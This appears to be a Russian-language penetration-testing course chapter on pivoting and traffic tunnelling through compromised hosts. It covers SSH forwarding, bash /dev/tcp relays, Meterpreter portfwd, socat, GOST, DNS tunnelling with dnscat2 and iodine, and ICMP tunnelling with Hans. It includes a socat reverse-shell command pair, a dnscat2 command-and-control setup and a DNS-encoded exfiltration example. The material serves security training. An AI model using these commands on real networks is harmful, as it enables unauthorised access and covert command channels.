### 11.2 Использование стандартных протоколов

Использование стандартных протоколов для проброса трафика:
преимущества и недостатки

#### **При использовании встроенных утилит:**

#### Плюсы:

- Удобство и простота использования
- Возможность использования почти на любой ОС
- Относительная надежность соединения

#### Минусы:

Во многих встроенных утилитах отсутствует механизм шифрования трафика

#### **При использовании внешних утилит:**

#### Плюсы:

- Внедрение механизмов шифрования
- Добавление дополнительных функций поддержания туннеля
- Возможность установки в большинство ОС для использования при отсутствии встроенных механизмов

#### Минусы:

- Необходимость установки потенциально вредоносного ПО
- Необходимость разбираться в сложных правилах проброса трафика
- Относительная ненадежность использования “самописного” ПО

### Использование встроенных утилит для проброса трафика

Встроенные утилиты отличаются тем, что используют только легитимные протоколы туннелирования и работы с портами, что
исключает возможность их использования для сокрытия трафика в сети или обхода ограничений.

#### **Популярные методы Port2Port в Bash**

Связывание портов локального сервера в Bash:

> mknod backpipe p; — создание именованного конвейера с правилом FIFO
> nc -lvnp 443 0<backpipe | nc -lvnp 3333 1&>backpipe — запуск прослушивания порта 443 и проверка конвейера к потоку
> ввода, привязка потока ввода конвейера к потоку вывода запущенного порта 3333

Связывание портов локального и удаленного серверов в Bash:

> exec 3<>/dev/tcp/192.168.1.2/443 — создание файлового дескриптора №3 и связывание потоков ввода-вывода портом 443
> внешнего узла 192.168.1.2

> exec 4<>/dev/tcp/0.0.0.0/3333 — создание файлового дескриптора №4 и связывание потоков ввода-вывода портом 3333 самого
> узла (“Джамп сервера”)

> cat <&3 &>&4 & — передача в фоновом режиме данных потока ввода из файлового дескриптора №3 на поток вывода файлового
> дескриптора №4

> cat <&4 &>&3 & — передача в фоновом режиме данных потока ввода из файлового дескриптора №4 на поток вывода файлового
> дескриптора №3

#### **Популярные методы Port2Port в SSH**

Связывание портов локального сервера в SSH на удаленном узле:

> $ ssh -R 0.0.0.0:10080:127.0.0.1:80 user@10.0.1.3 — при подключении к SSH на узле 10.0.1.3 откроется публичный порт
> 10080, который будет ссылаться на локальный порт 80 (который доступен только с самого узла)

Связывание портов локального и удаленного серверов в SSH на удаленном узле:

> $ ssh -R 0.0.0.0:10033:10.0.2.5:1433 user@10.0.1.3 — при подключении к SSH на узле 10.0.1.3 откроется публичный порт
> 10033, который будет ссылаться на порт 1433 удаленного узла 10.0.2.5

Связывание собственного локального порта и удаленного узла за сервером с SSH:

> ssh -L 10080:10.0.3.6:80 -N -f -l user@10.0.1.3 — при подключении к SSH на узел 10.0.1.3 на вашем локальном компьютере
> откроется порт 10080, который будет ссылаться на порт 80 адреса 10.0.3.6 узла стоящего в одной сети с узлом жертвой (
> 10.0.1.3)​​

В данных примерах узел 10.0.1.3 — узел жертвы, с доступом к узлу по протоколу SSH. Также его называют “Jump
server”.

#### **Использование метода Port2HostNet в SSH**

> ssh -f -N -D 4444 user@10.0.0.1

При помощи данной команды выполняются следующие действия:

- Устанавливается SSH-соединение с удаленным хостом по адресу 10.0.0.1, используя имя пользователя user
- Опция -f заставляет SSH-клиент запуститься в фоновом режиме
- Опция -N указывает на то, что SSH-клиент не должен выполнять какие-либо команды после подключения к удаленному хосту
- Опция -D 4444 создает SOCKS-прокси на локальной машине, который слушает порт 4444: все запросы на сетевые ресурсы
  будут
  перенаправляться через этот прокси на удаленный хост по зашифрованному каналу SSH (поддерживается Socks4 и Socks5)
- Опция -D в утилите SSH используется для создания динамического SOCKS-прокси на локальной машине. Когда вы используете
  опцию -D с SSH, SSH клиент подключается к удаленному хосту и на локальной машине открывается локальный SOCKS-прокси-
  сервер, который может быть использован для перенаправления трафика через зашифрованный туннель SSH на удаленном хосте.

### Использование внешних утилит для проброса трафика

Внешние утилиты позволяют нам не только использовать стандартные протоколы для проброса сетевого трафика, но и применять
изощренные методы передачи трафика в нецелевых для этого протоколах. Также они могут быть использованы из подручных
инструментов, используемых в ходе компрометации: Meterpreter, Cobalt Strike.

Для работы со стандартными протоколами проброса трафика познакомимся со следующими популярными утилитами:

- **Meterpreter** — это продвинутая, динамически расширяемая полезная нагрузка, которая использует стейджеры, инъекции
  DLL в
  памяти и распространяется по сети во время выполнения. Он взаимодействует через сокет стейджера и предоставляет
  обширный
  клиентский Ruby API. В нем есть история команд, завершение вкладок, каналы и многое другое.
- **Socat** — расшифровывается как SOcket CAT. Это утилита для передачи данных между двумя адресами. Универсальность
  socat
  заключается в том, что адрес может представлять сетевой сокет, любой дескриптор файла, датаграммный или потоковый
  сокет
  домена Unix, TCP и UDP (как в IPv4, так и в IPv6), SOCKS 4/4a в IPv4/IPv6, SCTP, PTY, именованные и неименованные
  конвейеры, OpenSSL, а в Linux — даже любое произвольное сетевое устройство.
- **GOST (GO Simple Tunnel)** — это инструмент для создания зашифрованных туннелей между двумя узлами сети с помощью
  протокола
  TCP/UDP, поддерживающий все популярные протоколы проксирования: HTTP/HTTPS/HTTP2/SOCKS4(A)/SOCKS5.

#### Meterpreter

Для проброса трафика через оболочку Meterpreter используется команда portfwd. Запустив эту команду на взломанном узле,
имеющем доступ к атакующей и целевой сети (или системе), мы можем перенаправлять TCP-соединения через эту машину,
превращая ее в точку поворота. Подобно технике проброса портов, используемой при ssh-соединении, portfwd будет
пересылать TCP-соединения к подключенным машинам и от них.

Пример команды:

> meterpreter > portfwd add –l 3389 –p 3389 –r [target host] — эта команда добавляет проброс порта (port forwarding) с
> локального порта 3389 на удаленный порт 3389 на целевом хосте [target host].
>

#### Socat

Как мы уже сказали, socat — это полноценный прокси для двунаправленной передачи данных между двумя независимыми каналами
данных. Помимо того, что socat умеет пробрасывать трафик в режиме p2p, он также может служить bind/reverse шеллом,
SSL-туннелем, конвейером для передачи данных из сети в устройства и т.п. Это крайне гибкий многофункциональный
инструмент ретрансляции.

Пример — P2P форвардинг на “джамп” сервере:
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &, где:

    lport — порт, который будет открыт на узле, где запущен socat
    redirect_ip — адрес, куда будет направлен трафик с узла
    rport — адрес порта, куда будет отправлен трафик с порта lport
    Пример обратного шелла:

> attacker > socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0 — поднимает сокет 1337 и берет / кладет туда данные в
> режиме терминала

> victim > socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane — присоединяется к сокету по адресу
> атакующего и отправляет все данные из него на исполнение

#### GOST

GO Simple Tunnel не сильно отличается по возможностям от предыдущей утилиты, но имеет более простой синтаксис правил.
Также язык разработки GO упрощает компиляцию исполняемого файла под заданную ОС.

Стандартные примеры использования:

Стандартный HTTP/SOCKS5 прокси:
> gost -L=:8080

Прокси с аутентификацией:
> gost -L=admin:123456@localhost:8080

Режим цепочки прокси:

    Прокси сервер: gost -L=socks://:1080
    Прокси клиент: gost -L=:8080 -F=socks://server_ip:1080

### Использование внешних утилит для скрытия трафика

Утилиты сокрытия трафика и обхода ограничений используют нестандартные протоколы, такие, как DNS и ICMP, позволяя обойти
блокировки или скрыть факт передачи данных.

### DNS-туннелирование

DNS-туннелирование (DNS Tunneling) — это метод использования DNS-протокола для передачи данных между компьютерами в
сети.

Одним из способов реализации DNS-туннелирования является использование поддоменов.

    Пример:
    
    OVUWIPJRGAYDCKDSMVTXK3DBOIUSAZ3JMQ6TSOJZFBZGKZ3VNRQXEKI.example.com

В имени поддомена закодирована строка: uid=1001(regular) gid=999(regular)

Другим способом реализации DNS-туннелирования является использование поля "OPCODE" в запросах DNS.
Поле "опкод" обычно используется для указания типа запроса (например, запрос на получение записи или запрос на
обновление записи), но может также использоваться для передачи полезной нагрузки, включая команды или файлы.

Максимальная длина “OPCODE” равна 4 битам (0-16).

Особые условия DNS-туннелирования

- Максимум 253 символа в домене
- Максимум 63 символа на поддомен
- Нечувствительность к регистру (поэтому мы используем кодировку Base32)
- TXT-запрос для получения максимального количества символов в ответе

Особенности использования DNS-туннеля: рекурсивные запросы

Такие запросы позволяют не использовать прямое соединение с сервером управления или прокси, чтобы получать доступ. Это
поведение может быть очень полезно в изолированном периметре или сети с ограничениями к соединениям между узлами.

Утилиты для DNS-туннелирования

- **DNSCAT2** — инструмент, предназначенный для создания зашифрованного командно-контрольного канала (C&C) через
  протокол DNS,
  который является эффективным туннелем практически из любой сети
- **Iodine** — программное обеспечение, позволяющее туннелировать данные IPv4 через сервер DNS сервер: это может быть
  полезно

в различных ситуациях, когда доступ в интернет исключен, но DNS-запросы разрешены
Пример работы с DNSCAT2:

Запуск сервера:
> ./dnscat2.rb our-domain-server.org

Запуск клиента:
> ./dnscat2 our-domain-server.org

При подключении клиента к серверу вы сможете управлять с сервера терминальной оболочкой, исполняющей команды на агенте.

Пример проброса туннелирования трафика через DNS-туннель:

> listen 4444 10.0.1.3:80 — поднимет на стороне сервера порт 4444, который будет отправлять трафик на узел 10.0.1.3 на
> порт 80 на стороне агента
>

#### ICMP-туннелирование
ICMP-туннель — скрытый канал для передачи данных, организованный между двумя узлами, использующий IP-пакеты с типом
протокола ICMP.

Пример инструмента:

**Hans** — делает возможным туннелирование IPv4 через эхо-пакеты ICMP, поэтому его можно назвать туннелем для пинга. Это
может быть полезно в ситуации, когда доступ в Интернет перекрыт, но пинги разрешены.

Для запуска в качестве сервера (от имени root):

> ./hans -s 10.1.2.0 -p password — это создаст новое tun-устройство и назначит ему IP 10.1.2.1

Для запуска в качестве клиента (от имени root):

> ./hans -c server_addess -p пароль — это позволит подключиться к серверу по адресу "server_addess", создать новое tun-устройство и назначить ему IP из сети 10.1.2.0/24

Теперь вы можете запустить прокси на сервере или позволить ему действовать как маршрутизатор и использовать NAT, чтобы
разрешить клиентам доступ в Интернет.

